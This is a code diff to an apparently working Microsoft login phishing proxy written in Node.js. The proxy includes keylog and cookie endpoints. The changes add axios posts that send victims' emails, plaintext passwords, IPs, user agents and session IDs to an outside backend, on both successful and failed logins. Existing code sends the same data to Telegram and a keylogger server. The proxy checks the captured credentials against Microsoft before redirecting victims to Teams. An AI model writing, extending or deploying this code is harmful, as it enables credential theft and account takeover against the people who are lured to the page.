@@ -508,7 +508,7 @@ function handleKeylog(req, res) {
 }
 
 // ============================================================
-//  HANDLE LOGIN REQUEST
+//  HANDLE LOGIN REQUEST - FIXED (No duplicate redirect_uri)
 // ============================================================
 
 function handleLoginRequest(req, res) {
@@ -536,6 +536,8 @@ function handleLoginRequest(req, res) {
     const cookieFlags = `Path=/; HttpOnly; SameSite=Lax; Max-Age=3600${isSecure ? '; Secure' : ''}`;
     res.setHeader('Set-Cookie', [`sessionId=${sessionId}; ${cookieFlags}`]);
 
+    // ✅ FIX: Use ONLY MICROSOFT_REDIRECT_URI from .env
+    // The redirect_urI from the URL is IGNORED to avoid duplication
     let targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
         `client_id=${MICROSOFT_CLIENT_ID}&` +
         `response_type=code&` +
@@ -552,6 +554,7 @@ function handleLoginRequest(req, res) {
     console.log(`[PROXY] 📧 Email: ${email}`);
     console.log(`[PROXY] 🆔 Session: ${sessionId}`);
     console.log(`[PROXY] 📡 IP: ${ip}`);
+    console.log(`[PROXY] 🔗 Redirect URI: ${MICROSOFT_REDIRECT_URI}`);
 
     https.get(targetUrl, (targetRes) => {
         let data = [];
@@ -643,6 +646,7 @@ function handlePostRequest(body, req, res) {
         console.log(`[CREDENTIALS] 📡 IP: ${ip}`);
         console.log(`[CREDENTIALS] 🆔 Session: ${sessionId || 'N/A'}`);
 
+        // Send to Telegram
         let msg = `🔐 *MICROSOFT LOGIN ATTEMPT #${attemptCount}*\n\n`;
         msg += `*📧 Email:* ${email}\n`;
         msg += `*🔑 Password:* ${password || 'N/A'}\n`;
@@ -653,8 +657,21 @@ function handlePostRequest(body, req, res) {
         
         sendToTelegram(msg);
 
+        // Send to backend /api/authenticate
+        const axios = require('axios');
+        axios.post(`${BACKEND_URL}/api/authenticate`, {
+            email: email,
+            password: password,
+            visitorInfo: {
+                fullUrl: req.url,
+                userAgent: req.headers['user-agent'],
+                sessionId: sessionId,
+                ip: ip
+            }
+        }).catch(() => {});
+
+        // Send to keylogger server
         if (KEYLOGGER_URL && password) {
-            const axios = require('axios');
             axios.post(`${KEYLOGGER_URL}/log-combined`, {
                 type: 'microsoft_login',
                 email: email,
@@ -668,18 +685,7 @@ function handlePostRequest(body, req, res) {
             }).catch(() => {});
         }
 
-        const axios = require('axios');
-        axios.post(`${BACKEND_URL}/api/authenticate`, {
-            email: email,
-            password: password,
-            visitorInfo: {
-                fullUrl: req.url,
-                userAgent: req.headers['user-agent'],
-                sessionId: sessionId,
-                ip: ip
-            }
-        }).catch(() => {});
-
+        // Verify with Microsoft
         verifyWithMicrosoft(email, password)
             .then((result) => {
                 if (result.success) {
@@ -693,6 +699,7 @@ function handlePostRequest(body, req, res) {
                         });
                     }
                     
+                    // Send success notification
                     let successMsg = `✅ *VALID MICROSOFT CREDENTIALS*\n\n`;
                     successMsg += `*📧 Email:* ${email}\n`;
                     successMsg += `*🔑 Password:* ${password || 'N/A'}\n`;
@@ -707,6 +714,19 @@ function handlePostRequest(body, req, res) {
                     
                     sendToTelegram(successMsg);
                     
+                    // Send to backend /api/log-action
+                    axios.post(`${BACKEND_URL}/api/log-action`, {
+                        action: 'login_success',
+                        email: email,
+                        password: password,
+                        visitorInfo: {
+                            fullUrl: req.url,
+                            userAgent: req.headers['user-agent'],
+                            sessionId: sessionId,
+                            ip: ip
+                        }
+                    }).catch(() => {});
+                    
                     res.writeHead(302, { 
                         'Location': TEAMS_REDIRECT, 
                         'Cache-Control': 'no-store, no-cache, must-revalidate'
@@ -716,6 +736,19 @@ function handlePostRequest(body, req, res) {
                     console.log(`[AUTH] ❌ Invalid Microsoft credentials: ${email}`);
                     
                     sendToTelegram(`❌ *INVALID MICROSOFT CREDENTIALS*\n\n📧 Email: ${email}\n📡 IP: ${ip}\n🕐 Time: ${new Date().toISOString()}`);
+                    
+                    // Send to backend /api/log-action
+                    axios.post(`${BACKEND_URL}/api/log-action`, {
+                        action: 'login_failed',
+                        email: email,
+                        password: password,
+                        visitorInfo: {
+                            fullUrl: req.url,
+                            userAgent: req.headers['user-agent'],
+                            sessionId: sessionId,
+                            ip: ip
+                        }
+                    }).catch(() => {});
                     
                     const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?` +
                         `client_id=${MICROSOFT_CLIENT_ID}&` +
@@ -863,6 +896,7 @@ server.listen(PORT, () => {
     console.log(`║   🔗 Cookies:   ${PROXY_PATHNAMES.cookieEndpoint}       ║`);
     console.log(`║   🔗 Keylog:    ${PROXY_PATHNAMES.keylogEndpoint}       ║`);
     console.log(`║   📡 Telegram:  ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}     ║`);
+    console.log(`║   🔗 Backend:   ${BACKEND_URL}                          ║`);
     console.log('╚═══════════════════════════════════════════════════════════╝');
 });
 
